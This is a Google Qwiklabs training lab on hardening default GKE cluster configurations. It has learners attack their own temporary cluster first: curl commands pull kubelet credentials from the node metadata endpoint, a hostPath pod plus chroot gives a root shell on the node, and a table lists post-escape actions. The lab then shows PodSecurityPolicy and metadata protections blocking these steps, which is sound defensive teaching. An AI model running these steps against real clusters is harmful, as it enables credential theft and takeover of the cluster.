# Hardening Default GKE Cluster Configurations

1 hour 30 minutes 9 Credits

## GSP496

![Google Cloud Self-Paced Labs](https://cdn.qwiklabs.com/GMOHykaqmlTHiqEeQXTySaMXYPHeIvaqa2qHEzw6Occ%3D)

### Overview

This lab demonstrates some of the security concerns of a default GKE cluster configuration and the corresponding hardening measures to prevent multiple paths of pod escape and cluster privilege escalation. These attack paths are relevant in the following scenarios:

1.  An application flaw in an external facing pod that allows for Server-Side Request Forgery (SSRF) attacks.
2.  A fully compromised container inside a pod allowing for Remote Command Execution (RCE).
3.  A malicious internal user or an attacker with a set of compromised internal user credentials with the ability to create/update a pod in a given namespace.

This lab was created by GKE Helmsman engineers to help you grasp a better understanding of hardening default GKE cluster configurations.

*`The example code for this lab is provided as-is without warranty or guarantee`*

### Objectives

Upon completion of this lab you will understand the need for protecting the GKE Instance Metadata and defining appropriate PodSecurityPolicy policies for your environment.

You will:

1.  Create a small GKE cluster using the default settings.

2.  Validate the most common paths of pod escape and cluster privilege escalation from the perspective of a malicious internal user.

3.  Harden the GKE cluster for these issues.

4.  Validate the cluster no longer allows for each of those actions to occur.

### Set up

#### Before you click the Start Lab button

Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources will be made available to you.

This Qwiklabs hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google Cloud for the duration of the lab.

#### What you need

To complete this lab, you need:

*   Access to a standard internet browser (Chrome browser recommended).
*   Time to complete the lab.

**Note:** If you already have your own personal Google Cloud account or project, do not use it for this lab.

**Note:** If you are using a Pixelbook, open an Incognito window to run this lab.

#### How to start your lab and sign in to the Google Cloud Console

1.  Click the **Start Lab** button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is a panel populated with the temporary credentials that you must use for this lab.

    ![Open Google Console](https://cdn.qwiklabs.com/%2FtHp4GI5VSDyTtdqi3qDFtevuY014F88%2BFow%2FadnRgE%3D)

2.  Copy the username, and then click **Open Google Console**. The lab spins up resources, and then opens another tab that shows the **Sign in** page.

    ![Sign in](https://cdn.qwiklabs.com/VkUIAFY2xX3zoHgmWqYKccRLwFrR4BfARLd5ojmlbhs%3D)

    **_Tip:_** Open the tabs in separate windows, side-by-side.

    <aside>If you see the **Choose an account** page, click **Use Another Account**. ![Choose an account](https://cdn.qwiklabs.com/eQ6xPnPn13GjiJP3RWlHWwiMjhooHxTNvzfg1AL2WPw%3D)</aside>

3.  In the **Sign in** page, paste the username that you copied from the Connection Details panel. Then copy and paste the password.

    **_Important:_** You must use the credentials from the Connection Details panel. Do not use your Qwiklabs credentials. If you have your own Google Cloud account, do not use it for this lab (avoids incurring charges).

4.  Click through the subsequent pages:

    *   Accept the terms and conditions.
    *   Do not add recovery options or two-factor authentication (because this is a temporary account).
    *   Do not sign up for free trials.

After a few moments, the Cloud Console opens in this tab.

<aside>**Note:** You can view the menu with a list of Google Cloud Products and Services by clicking the **Navigation menu** at the top-left. ![Cloud Console Menu](https://cdn.qwiklabs.com/9vT7xPlxoNP%2FPsK0J8j0ZPFB4HnnpaIJVCDByaBrSHg%3D)</aside>

### Activate Cloud Shell

Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud. Cloud Shell provides command-line access to your Google Cloud resources.

In the Cloud Console, in the top right toolbar, click the **Activate Cloud Shell** button.

![Cloud Shell icon](https://cdn.qwiklabs.com/vdY5e%2Fan9ZGXw5a%2FZMb1agpXhRGozsOadHURcR8thAQ%3D)

Click **Continue**.

![cloudshell_continue.png](https://cdn.qwiklabs.com/lr3PBRjWIrJ%2BMQnE8kCkOnRQQVgJnWSg4UWk16f0s%2FA%3D)

It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your _PROJECT_ID_. For example:

![Cloud Shell Terminal](https://cdn.qwiklabs.com/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D)

`gcloud` is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.

You can list the active account name with this command:

    gcloud auth list

(Output)

    Credentialed accounts:
     - <myaccount>@<mydomain>.com (active)

(Example output)

    Credentialed accounts:
     - google1623327_student@qwiklabs.net

You can list the project ID with this command:

    gcloud config list project

(Output)

    [core]
    project = <project_ID>

(Example output)

    [core]
    project = qwiklabs-gcp-44776a13dea667a6

<aside>For full documentation of `gcloud` see the [gcloud command-line tool overview](https://cloud.google.com/sdk/gcloud).</aside>

### Create a simple GKE cluster

1.  Set a zone into an environment variable called MY_ZONE. This lab is using `us-central1-a`, you can select a [zone](https://cloud.google.com/compute/docs/regions-zones/) if you prefer:
```
    export MY_ZONE=us-central1-a
```
1.  Run this to start a Kubernetes cluster managed by Kubernetes Engine named `simplecluster` and configure it to run 2 nodes:

    gcloud container clusters create simplecluster --zone $MY_ZONE --num-nodes 2 --metadata=disable-legacy-endpoints=false

It takes several minutes to create a cluster as Kubernetes Engine provisions virtual machines for you. The warnings about features available in new versions can be safely ignored for this lab.

1.  After the cluster is created, check your installed version of Kubernetes using the `kubectl version` command:

    kubectl version

The `gcloud container clusters create` command automatically authenticated `kubectl` for you.

1.  View your running nodes in the GCP Console. On the **Navigation menu**, click **Compute Engine** > **VM Instances**.

Your Kubernetes cluster is now ready for use.

Click _Check my progress_ to verify the objective. <ql-activity-tracking step="1">Create a simple GKE cluster</ql-activity-tracking>

### Run a Google Cloud-SDK pod

1.  From your Cloud Shell prompt, launch a single instance of the Google Cloud-SDK container:

    kubectl run -it --rm gcloud --image=google/cloud-sdk:latest --restart=Never -- bash

This will take a few minutes to complete.

1.  You should now have a bash shell inside the pod's container:

    root@gcloud:/#

It may take a few seconds for the container to be started and the command prompt to be displayed. If you don't see a command prompt, try pressing **Enter**.

### Explore the Legacy Compute Metadata Endpoint

In GKE Clusters created with version 1.11 or below, the "Legacy" or `v1beta1` Compute Metadata endpoint is available by default. Unlike the current Compute Metadata version, `v1`, the `v1beta1` Compute Metadata endpoint does not require a custom HTTP header to be included in all requests. On new GKE Clusters created at version 1.12 or greater, the legacy Compute Engine metadata endpoints are now disabled by default. For more information, see: [https://cloud.google.com/kubernetes-engine/docs/how-to/protecting-cluster-metadata](https://cloud.google.com/kubernetes-engine/docs/how-to/protecting-cluster-metadata)

Run the following command to access the "Legacy" Compute Metadata endpoint without requiring a custom HTTP header to get the GCE Instance name where this pod is running:

    curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/name

Output looks like:

    gke-simplecluster-default-pool-b57a043a-6z5v

Now, re-run the same command, but instead use the `v1` Compute Metadata endpoint:

    curl -s http://metadata.google.internal/computeMetadata/v1/instance/name

Output looks like:

    ...snip...
    Your client does not have permission to get URL <code>/computeMetadata/v1/instance/name</code> from this server. Missing Metadata-Flavor:Google header.
    ...snip...

Notice how it returns an error stating that it requires the custom HTTP header to be present. Add the custom header on the next run and retrieve the GCE instance name that is running this pod:

    curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/name

Output looks like:

    gke-simplecluster-default-pool-b57a043a-6z5v

Without requiring a custom HTTP header when accessing the GCE Instance Metadata endpoint, a flaw in an application that allows an attacker to trick the code into retrieving the contents of an attacker-specified web URL could provide a simple method for enumeration and potential credential exfiltration. By requiring a custom HTTP header, the attacker needs to exploit an application flaw that allows them to control the URL and also add custom headers in order to carry out this attack successfully.

Keep this shell inside the pod available for the next step. If you accidentally exit from the pod, simply re-run:

    kubectl run -it --rm gcloud --image=google/cloud-sdk:latest --restart=Never -- bash

### Explore the GKE node bootstrapping credentials

1.  From inside the same pod shell, run the following command to list the attributes associated with the underlying GCE instances. Be sure to include the trailing slash:

    curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/

1.  Perhaps the most sensitive data in this listing is `kube-env`. It contains several variables which the `kubelet` uses as initial credentials when attaching the node to the GKE cluster. The variables `CA_CERT`, `KUBELET_CERT`, and `KUBELET_KEY` contain this information and are therefore considered sensitive to non-cluster administrators.

To see the potentially sensitive variables and data, run the following command:

    curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env

Therefore, in any of the following situations:

1.  A flaw that allows for SSRF in a pod application
2.  An application or library flaw that allow for RCE in a pod
3.  An internal user with the ability to create or exec into a pod

There exists a high likelihood for compromise and exfiltration of sensitive `kubelet` bootstrapping credentials via the Compute Metadata endpoint. With the `kubelet` credentials, it is possible to leverage them in certain circumstances to escalate privileges to that of `cluster-admin` and therefore have full control of the GKE Cluster including all data, applications, and access to the underlying nodes.

### Leverage the Permissions Assigned to this Node Pool's Service Account

By default, GCP projects with the Compute API enabled have a default service account in the format of `NNNNNNNNNN-compute@developer.gserviceaccount.com` in the project and the `Editor` role attached to it. Also by default, GKE clusters created without specifying a service account will utilize the default Compute service account and attach it to all worker nodes.

1.  Run the following `curl` command to list the OAuth scopes associated with the service account attached to the underlying GCE instance:

    curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes

(output)

    https://www.googleapis.com/auth/devstorage.read_only
    https://www.googleapis.com/auth/logging.write
    https://www.googleapis.com/auth/monitoring
    https://www.googleapis.com/auth/service.management.readonly
    https://www.googleapis.com/auth/servicecontrol
    https://www.googleapis.com/auth/trace.append

The combination of authentication scopes and the permissions of the service account dictates what applications on this node can access. The above list is the minimum scopes needed for most GKE clusters, but some use cases require increased scopes.

If the authentication scope were to be configured during cluster creation to include `https://www.googleapis.com/auth/cloud-platform`, this would allow any GCP API to be considered "in scope", and only the IAM permissions assigned to the service account would determine what can be accessed. If the default service account is in use and the default IAM Role of `Editor` was not modified, this effectively means that any pod on this node pool has `Editor` permissions to the GCP project where the GKE cluster is deployed. As the `Editor` IAM Role has a wide range of read/write permissions to interact with resources in the project such as Compute instances, GCS buckets, GCR registries, and more, this is most likely not desired.

1.  Exit out of this pod by typing:

    exit

### Deploy a pod that mounts the host filesystem

One of the simplest paths for "escaping" to the underlying host is by mounting the host's filesystem into the pod's filesystem using standard Kubernetes `volumes` and `volumeMounts` in a `Pod` specification.

1.  To demonstrate this, run the following to create a Pod that mounts the underlying host filesystem `/` at the folder named `/rootfs` inside the container:

    cat <<EOF | kubectl apply -f -
    apiVersion: v1
    kind: Pod
    metadata:
      name: hostpath
    spec:
      containers:
      - name: hostpath
        image: google/cloud-sdk:latest
        command: ["/bin/bash"]
        args: ["-c", "tail -f /dev/null"]
        volumeMounts:
        - mountPath: /rootfs
          name: rootfs
      volumes:
      - name: rootfs
        hostPath:
          path: /
    EOF

1.  Run `kubectl get pod` and re-run until it's in the "Running" state:

    kubectl get pod

(Output)

    NAME       READY   STATUS    RESTARTS   AGE
    hostpath   1/1     Running   0          30s

Click _Check my progress_ to verify the objective. <ql-activity-tracking step="2">Deploy a pod that mounts the host filesystem</ql-activity-tracking>

### Explore and compromise the underlying host

Run the following to obtain a shell inside the pod you just created:

    kubectl exec -it hostpath -- bash

Switch to the pod shell's root filesystem point to that of the underlying host:

    chroot /rootfs /bin/bash

With those simple commands, the pod is now effectively a `root` shell on the node. You are now able to do the following:

<table>

<tbody>

<tr>

<td colspan="1" rowspan="1">

run the standard docker command with full permissions

</td>

<td colspan="1" rowspan="1">

`docker ps`

</td>

</tr>

<tr>

<td colspan="1" rowspan="1">

list docker images

</td>

<td colspan="1" rowspan="1">

`docker images`

</td>

</tr>

<tr>

<td colspan="1" rowspan="1">

`docker run` a privileged container of your choosing

</td>

<td colspan="1" rowspan="1">

`docker run --privileged <imagename>:<imageversion>`

</td>

</tr>

<tr>

<td colspan="1" rowspan="1">

examine the Kubernetes secrets mounted

</td>

<td colspan="1" rowspan="1">

`mount | grep volumes | awk '{print $3}' | xargs ls`

</td>

</tr>

<tr>

<td colspan="1" rowspan="1">

`exec` into any running container (even into another pod in another namespace)

</td>

<td colspan="1" rowspan="1">

`docker exec -it <docker container ID> sh`

</td>

</tr>

</tbody>

</table>

Nearly every operation that the `root` user can perform is available to this pod shell. This includes persistence mechanisms like adding SSH users/keys, running privileged docker containers on the host outside the view of Kubernetes, and much more.

To exit the pod shell, run `exit` twice - once to leave the `chroot` and another to leave the pod's shell:

    exit

    exit

Now you can delete the `hostpath` pod:

    kubectl delete pod hostpath

### Understand the available controls

The next steps of this demo will cover:

*   **Disabling the Legacy GCE Metadata API Endpoint** - By specifying a custom metadata key and value, the `v1beta1` metadata endpoint will no longer be available from the instance.

*   **Enable Metadata Concealment** - Passing an additional configuration during cluster and/or node pool creation, a lightweight proxy will be installed on each node that proxies all requests to the Metadata API and prevents access to sensitive endpoints.

*   **Enable and configure PodSecurityPolicy** - Configuring this option on a GKE cluster will add the PodSecurityPolicy Admission Controller which can be used to restrict the use of insecure settings during Pod creation. In this demo's case, preventing containers from running as the root user and having the ability to mount the underlying host filesystem.

### Deploy a second node pool

To enable you to experiment with and without the Metadata endpoint protections in place, you'll create a second node pool that includes two additional settings. Pods that are scheduled to the generic node pool will not have the protections, and Pods scheduled to the second node pool will have them enabled.

Note: In GKE versions 1.12 and newer, the `--metadata=disable-legacy-endpoints=true` setting will automatically be enabled. The next command is defining it explicitly for clarity.

Create the second node pool:

    gcloud beta container node-pools create second-pool --cluster=simplecluster --zone=$MY_ZONE --num-nodes=1 --metadata=disable-legacy-endpoints=true --workload-metadata-from-node=SECURE

Click _Check my progress_ to verify the objective. <ql-activity-tracking step="3">Deploy a second node pool</ql-activity-tracking>

### Run a Google Cloud-SDK pod

1.  In Cloud Shell, launch a single instance of the Google Cloud-SDK container that will be run only on the second node pool with the protections enabled and not run as the root user.

    kubectl run -it --rm gcloud --image=google/cloud-sdk:latest --restart=Never --overrides='{ "apiVersion": "v1", "spec": { "securityContext": { "runAsUser": 65534, "fsGroup": 65534 }, "nodeSelector": { "cloud.google.com/gke-nodepool": "second-pool" } } }' -- bash

1.  You should now have a bash shell inside the pod's container running on the node pool named `second-pool`. You should see the following:

    nobody@gcloud:/$

It may take a few seconds for the container to be started and the command prompt to be displayed.

If you don't see a command prompt, try pressing enter.

### Explore various blocked endpoints

1.  With the configuration of the second node pool set to `--metadata=disable-legacy-endpoints=true`, the following command will now fail as expected:

    curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/name

(Output)

    ...snip...
    Legacy metadata endpoints are disabled. Please use the /v1/ endpoint.
    ...snip...

1.  With the configuration of the second node pool set to `--workload-metadata-from-node=SECURE` , the following command to retrieve the sensitive file, `kube-env`, will now fail:

    curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env

(Output)

    This metadata endpoint is concealed.

1.  But other commands to non-sensitive endpoints will still succeed if the proper HTTP header is passed:

    curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/name

(Example Output)

    gke-simplecluster-second-pool-8fbd68c5-gzzp

Exit out of the pod:

    exit

You should now be back in Cloud Shell.

### Deploy PodSecurityPolicy objects

1.  In order to have the necessary permissions to proceed, grant explicit permissions to your own user account to become `cluster-admin:`

    kubectl create clusterrolebinding clusteradmin --clusterrole=cluster-admin --user="$(gcloud config list account --format 'value(core.account)')"

(Output)

    clusterrolebinding.rbac.authorization.k8s.io/clusteradmin created

1.  Next, deploy a more restrictive `PodSecurityPolicy` on all authenticated users in the default namespace:

    cat <<EOF | kubectl apply -f -
    ---
    apiVersion: policy/v1beta1
    kind: PodSecurityPolicy
    metadata:
      name: restrictive-psp
      annotations:
        seccomp.security.alpha.kubernetes.io/allowedProfileNames: 'docker/default'
        apparmor.security.beta.kubernetes.io/allowedProfileNames: 'runtime/default'
        seccomp.security.alpha.kubernetes.io/defaultProfileName:  'docker/default'
        apparmor.security.beta.kubernetes.io/defaultProfileName:  'runtime/default'
    spec:
      privileged: false
      # Required to prevent escalations to root.
      allowPrivilegeEscalation: false
      # This is redundant with non-root + disallow privilege escalation,
      # but we can provide it for defense in depth.
      requiredDropCapabilities:
        - ALL
      # Allow core volume types.
      volumes:
        - 'configMap'
        - 'emptyDir'
        - 'projected'
        - 'secret'
        - 'downwardAPI'
        # Assume that persistentVolumes set up by the cluster admin are safe to use.
        - 'persistentVolumeClaim'
      hostNetwork: false
      hostIPC: false
      hostPID: false
      runAsUser:
        # Require the container to run without root privileges.
        rule: 'MustRunAsNonRoot'
      seLinux:
        # This policy assumes the nodes are using AppArmor rather than SELinux.
        rule: 'RunAsAny'
      supplementalGroups:
        rule: 'MustRunAs'
        ranges:
          # Forbid adding the root group.
          - min: 1
            max: 65535
      fsGroup:
        rule: 'MustRunAs'
        ranges:
          # Forbid adding the root group.
          - min: 1
            max: 65535
    EOF

(Output)

    podsecuritypolicy.extensions/restrictive-psp created

1.  Next, add the `ClusterRole` that provides the necessary ability to "use" this PodSecurityPolicy.

    cat <<EOF | kubectl apply -f -
    ---
    kind: ClusterRole
    apiVersion: rbac.authorization.k8s.io/v1
    metadata:
      name: restrictive-psp
    rules:
    - apiGroups:
      - extensions
      resources:
      - podsecuritypolicies
      resourceNames:
      - restrictive-psp
      verbs:
      - use
    EOF

(Output)

    clusterrole.rbac.authorization.k8s.io/restrictive-psp created

1.  Finally, create a RoleBinding in the default namespace that allows any authenticated user permission to leverage the PodSecurityPolicy.

    cat <<EOF | kubectl apply -f -
    ---
    # All service accounts in kube-system
    # can 'use' the 'permissive-psp' PSP
    apiVersion: rbac.authorization.k8s.io/v1
    kind: RoleBinding
    metadata:
      name: restrictive-psp
      namespace: default
    roleRef:
      apiGroup: rbac.authorization.k8s.io
      kind: ClusterRole
      name: restrictive-psp
    subjects:
    - apiGroup: rbac.authorization.k8s.io
      kind: Group
      name: system:authenticated
    EOF

(Output)

    rolebinding.rbac.authorization.k8s.io/restrictive-psp created

**Note:** In a real environment, consider replacing the `system:authenticated` user in the RoleBinding with the specific user or service accounts that you want to have the ability to create pods in the default namespace.

Click _Check my progress_ to verify the objective. <ql-activity-tracking step="4">Deploy PodSecurityPolicy objects</ql-activity-tracking>

### Enable PodSecurity policy

Next, enable the PodSecurityPolicy Admission Controller:

    gcloud beta container clusters update simplecluster --zone $MY_ZONE --enable-pod-security-policy

This will take a few minutes to complete.

### Deploy a blocked pod that mounts the host filesystem

Because the account used to deploy the GKE cluster was granted cluster-admin permissions in a previous step, it's necessary to create another separate "user" account to interact with the cluster and validate the PodSecurityPolicy enforcement.

1.  To do this, run:

    gcloud iam service-accounts create demo-developer

(Output)

    Created service account [demo-developer].

1.  Next, run these commands to grant these permissions to the service account - the ability to interact with the cluster and attempt to create pods:

    MYPROJECT=$(gcloud config list --format 'value(core.project)')

    gcloud projects add-iam-policy-binding "${MYPROJECT}" --role=roles/container.developer --member="serviceAccount:demo-developer@${MYPROJECT}.iam.gserviceaccount.com"

1.  Obtain the service account credentials file by running:

    gcloud iam service-accounts keys create key.json --iam-account "demo-developer@${MYPROJECT}.iam.gserviceaccount.com"

1.  Configure `kubectl` to authenticate as this service account:

    gcloud auth activate-service-account --key-file=key.json

1.  To configure `kubectl` to use these credentials when communicating with the cluster, run:

    gcloud container clusters get-credentials simplecluster --zone $MY_ZONE

1.  Now, try to create another pod that mounts the underlying host filesystem `/` at the folder named `/rootfs` inside the container:

    cat <<EOF | kubectl apply -f -
    apiVersion: v1
    kind: Pod
    metadata:
      name: hostpath
    spec:
      containers:
      - name: hostpath
        image: google/cloud-sdk:latest
        command: ["/bin/bash"]
        args: ["-c", "tail -f /dev/null"]
        volumeMounts:
        - mountPath: /rootfs
          name: rootfs
      volumes:
      - name: rootfs
        hostPath:
          path: /
    EOF

1.  This output validatates that it's blocked by PSP:

    Error from server (Forbidden): error when creating "STDIN": pods "hostpath" is forbidden: unable to validate against any pod security policy: [spec.volumes[0]: Invalid value: "hostPath": hostPath volumes are not allowed to be used]

1.  Deploy another pod that meets the criteria of the `restrictive-psp`:

    cat <<EOF | kubectl apply -f -
    apiVersion: v1
    kind: Pod
    metadata:
      name: hostpath
    spec:
      securityContext:
        runAsUser: 1000
        fsGroup: 2000
      containers:
      - name: hostpath
        image: google/cloud-sdk:latest
        command: ["/bin/bash"]
        args: ["-c", "tail -f /dev/null"]
    EOF

(Output)

    pod/hostpath created

1.  To view the annotation that gets added to the pod indicating which PodSecurityPolicy authorized the creation, run:

    kubectl get pod hostpath -o=jsonpath="{ .metadata.annotations.kubernetes\.io/psp }"

(Output appended to the Cloud Shell command line)

    restrictive-psp

Click _Check my progress_ to verify the objective. <ql-activity-tracking step="5">Deploy a blocked pod that mounts the host filesystem</ql-activity-tracking>

### Congratulations!

In this lab you configured a default Kubernetes cluster in Google Kubernetes Engine. You then probed and exploited the access available to your pod, hardened the cluster, and validated those malicious actions were no longer possible.

![gke_best_security_badge.png](https://cdn.qwiklabs.com/maNNnEGq9cLqRzxQkol4VrPlDzyruxMCXVMlMRHwRhM%3D)

### Finish Your Quest

This self-paced lab is part of the Qwiklabs [Google Kubernetes Engine Best Practices: Security](https://google.qwiklabs.com/quests/64) Quest. A Quest is a series of related labs that form a learning path. Completing this Quest earns you the badge above, to recognize your achievement. You can make your badge (or badges) public and link to them in your online resume or social media account. [Enroll in this Quest](https://google.qwiklabs.com/quests/64/enroll) and get immediate completion credit if you've taken this lab. [See other available Qwiklabs Quests](https://google.qwiklabs.com/catalog).

### Take your next lab

Continue your Quest with [Google Kubernetes Engine Security: Binary Authorization](https://google.qwiklabs.com/catalog_lab/1718), or check out these suggestions:

*   [Hardening Default GKE Cluster Configurations](https://google.qwiklabs.com/catalog_lab/1722)

*   [Using Role-basd Access Control in Kubernetes Engine](https://google.qwiklabs.com/catalog_lab/1720)

### Next Steps / Learn More

**IMPORTANT:** While this lab covers several security issues in detail, there are other areas that should be considered in your environment. Refer to [https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster) for additional information.

PodSecurityPolicy: [https://cloud.google.com/kubernetes-engine/docs/how-to/pod-security-policies](https://cloud.google.com/kubernetes-engine/docs/how-to/pod-security-policies) and [https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#restrict_pod_permissions](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#restrict_pod_permissions)

Node Service Accounts: [https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#use_least_privilege_sa](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#use_least_privilege_sa)

Protecting Node Metadata: [https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#protect_node_metadata](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#protect_node_metadata)

### Google Cloud Training & Certification

...helps you make the most of Google Cloud technologies. [Our classes](https://cloud.google.com/training/courses) include technical skills and best practices to help you get up to speed quickly and continue your learning journey. We offer fundamental to advanced level training, with on-demand, live, and virtual options to suit your busy schedule. [Certifications](https://cloud.google.com/certification/) help you validate and prove your skill and expertise in Google Cloud technologies.

##### Manual Last Updated October 16, 2020

##### Lab Last Tested October 16, 2020

Copyright 2020 Google LLC All rights reserved. Google and the Google logo are trademarks of Google LLC. All other company and product names may be trademarks of the respective companies with which they are associated.

</div>

</div>

<div class="hidden js-end-lab-button-container lab-content__end-lab-button"><ql-lab-control-button class="js-end-lab-button" running=""></ql-lab-control-button></div>

<div class="lab-content__renderable-instructions">

<div class="lab-content__recommendation">

<section class="upcoming-cards">

## Continue questing

<div class="content-card-grid">

<div class="card-content-wrapper js-content-card" data-id="2762" data-level="Advanced" data-name="Migrating to GKE Containers" data-type="Lab">[

<div class="card__body">

<div class="overline card--content__type">Hands-On Lab</div>

### Migrating to GKE Containers

This lab teaches you how to migrate a stateless application from running on a VM to running on Kubernetes Engine (GKE). You will learn about the lifecycle of an application transitioning from a typical VM/OS-based deployment to three different containerized cloud infrastructure platforms.

</div>

<div class="card__footer">

<div class="card__footer__left"><span>Advanced</span></div>

</div>

](/focuses/12768?parent=catalog)</div>

</div>

</section>

</div>

</div>

</ql-drawer-content><ql-drawer end="" id="outline-drawer" open="" slot="drawer" width="320">

<div class="js-lab-content-outline lab-content__outline">[GSP496](#step1)</div>

</ql-drawer></ql-drawer-container></ql-drawer-content></ql-drawer-container>

<div class="lab-introduction js-lab-introduction is-hidden">

<div class="lab-introduction__inner">

# Welcome to Your First Lab!

<ql-icon-button class="js-skip-button">close</ql-icon-button>

<div class="lab-introduction__video"><iframe allow="autoplay; encrypted-media" allowfullscreen="" frameborder="0" id="lab-introduction" src="https://www.youtube.com/embed/yF7EDXKTmoQ?enablejsapi=1&amp;rel=0&amp;showinfo=0"></iframe></div>

<a class="js-skip-button button button--outline">Skip this video</a></div>

</div>

</div>

</main>

<div class="modal fade" id="lab-details-modal">

<div class="modal-container">

<div class="mdl-shadow--24dp modal-content">

<div class="modal-body">

This lab demonstrates some of the security concerns of a default GKE cluster configuration and the corresponding hardening measures to prevent multiple paths of pod escape and cluster privilege escalation

This lab is included in these quests: [Google Kubernetes Engine Best Practices: Security](/quests/64), [Secure Workloads in Google Kubernetes Engine](/quests/142). If you complete this lab you'll receive credit for it when you enroll in one of these quests.

**Duration:** 0m setup · 90m access · 90m completion

<span>**Levels:** expert</span>

**Permalink:** [https://google.qwiklabs.com/catalog_lab/1722](https://google.qwiklabs.com/catalog_lab/1722)

</div>

<div class="modal-actions"><a class="button button--text" data-dismiss="modal">Got It</a></div>

</div>

</div>

<iframe class="l-ie-iframe-fix"></iframe></div>

<div class="modal fade" id="lab-review-modal">

<div class="modal-container">

<div class="mdl-shadow--24dp modal-content">

<form class="simple_form js-lab-review-form" id="new_lab_review" action="/lab_reviews" accept-charset="UTF-8" data-remote="true" method="post"><input name="utf8" type="hidden" value="✓">

<div class="modal-body">

How satisfied are you with this lab?*

<div class="l-mtm">

<div class="control-group hidden lab_review_user_id">

<div class="controls"><input class="hidden" type="hidden" value="4061609" name="lab_review[user_id]" id="lab_review_user_id"></div>

</div>

<div class="control-group hidden lab_review_classroom_id">

<div class="controls"><input class="hidden" type="hidden" name="lab_review[classroom_id]" id="lab_review_classroom_id"></div>

</div>

<div class="control-group hidden lab_review_lab_id">

<div class="controls"><input class="hidden" type="hidden" value="1722" name="lab_review[lab_id]" id="lab_review_lab_id"></div>

</div>

<div class="control-group hidden lab_review_focus_id">

<div class="controls"><input class="hidden" type="hidden" name="lab_review[focus_id]" id="lab_review_focus_id"></div>

</div>

<div class="control-group hidden lab_review_rating">

<div class="controls"><input class="hidden js-rating-input" type="hidden" name="lab_review[rating]" id="lab_review_rating"></div>

</div>

<div class="control-group text optional lab_review_comment"><label class="text optional control-label" for="lab_review_comment">Comment</label>

<div class="controls"><textarea class="text optional" name="lab_review[comment]" id="lab_review_comment"></textarea></div>

</div>

</div>

</div>

<div class="modal-actions"><a class="button button--text" data-dismiss="modal">Cancel</a> <input type="submit" name="commit" value="Submit" disabled="disabled" id="submit" data-disabled="false" class="button" data-disable-with="Submit"></div>

</form>

</div>

</div>

<iframe class="l-ie-iframe-fix"></iframe></div>

<div class="modal fade" id="lab-access-modal">

<div class="modal-container">

<div class="mdl-shadow--24dp modal-content"><a class="lab-access-modal-close" data-analytics-action="dismissed_lab_payment_modal" data-dismiss="modal">_close_</a>

<form class="js-lab-access-form" action="/lab_onetime_coupons/activate?parent=catalog" accept-charset="UTF-8" data-remote="true" method="post"><input name="utf8" type="hidden" value="✓">

<div class="modal-body">

<div class="lab-access-modal"><input type="hidden" name="id" id="id" value="5158"> <input type="hidden" name="user_id" id="user_id" value="4061609"> <input type="hidden" name="launch_with_credits" id="launch_with_credits" value="0" class="js-launch-with-credits-input"> <input type="hidden" name="launch_with_subs" id="launch_with_subs" value="0" class="js-launch-with-subscription-input">

<div class="lab-access-modal__method">

This lab costs 9 Credits.

You have a valid subscription package. Would you like to charge this lab to your subscription?

<a class="button js-launch-with-subscription-button js-lab-access-modal-button" data-analytics-action="clicked_launch_with_subscription_button">Use Subscription</a></div>

<div class="lab-access-modal__method">

Enter Lab Access Code:

<div class="lab-access-modal__code js-access-code"><input type="text" name="uuid_1" id="uuid_1" value="" maxlength="4" placeholder="1234" class="js-access-code-input"> <input type="text" name="uuid_2" id="uuid_2" value="" maxlength="4" placeholder="1234" class="js-access-code-input"> <input type="text" name="uuid_3" id="uuid_3" value="" maxlength="4" placeholder="1234" class="js-access-code-input"> <input type="text" name="uuid_4" id="uuid_4" value="" maxlength="4" placeholder="1234" class="js-access-code-input"></div>

<a class="button js-launch-with-access-code-button js-lab-access-modal-button" data-analytics-action="clicked_launch_with_access_code_button">Launch with Access Code</a></div>

</div>

</div>

</form>

</div>

</div>

<iframe class="l-ie-iframe-fix"></iframe></div>

<script>$( function() { ql.initMaterialInputs(); initChosen(); initSearch(); initTabs(); ql.list.init(); ql.favoriting.init(); ql.header.myAccount.init(); initTooltips(); ql.autocomplete.init(); ql.modals.init(); ql.toggleButtons.init(); ql.analytics.init(); ql.favoriting.init(); ql.labControlPanel.addRecaptchaErrorHandler(); initLabContent(); ql.labOutline.links.init(); initLabReviewModal(); initLabAccessModal(); ql.labAssessment.init(); ql.labIntroduction.init( true ); ql.labData.init(); initLabTranslations( {"are_you_sure":"All done? If you end this lab, you will lose all your work. You may not be able to restart the lab if there is a quota limit. Are you sure you want to end this lab?\n","in_progress":"*In Progress*","ending":"*Ending*","starting":"*Starting, please wait*","end_concurrent_labs":"Sorry, you can only run one lab at a time. To start this lab, please confirm that you want all of your existing labs to end.\n","copied":"Copied","no_resource":"Error retrieving resource.","no_support":"No Support","mac_press":"Press ⌘-C to copy","thanks_review":"Thanks for reviewing this lab.","windows_press":"Press Ctrl-C to copy","days":"days"} ); ql.labRun.init(); ql.chat.init(); ql.initHeader(); ql.navigation.init(); 